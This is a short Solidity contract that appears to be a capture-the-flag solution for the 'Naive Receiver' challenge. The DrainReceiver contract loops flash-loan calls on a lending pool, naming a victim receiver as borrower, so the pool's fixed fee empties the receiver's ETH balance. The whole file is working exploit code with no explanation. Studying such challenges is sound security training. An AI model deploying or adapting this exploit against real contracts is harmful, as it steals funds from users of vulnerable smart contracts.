// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaiveReceiverLenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
    function fixedFee() external pure returns (uint256);
}

contract DrainReceiver {
    INaiveReceiverLenderPool private pool;

    constructor(address _pool) {
        pool = INaiveReceiverLenderPool(_pool);
    }

    function drainReceiver(address _receiver) public {
        uint8 times = uint8(_receiver.balance / pool.fixedFee());
        for (uint8 i = 0; i < times; i++) {
            pool.flashLoan(_receiver, address(pool).balance);
        }
    }
}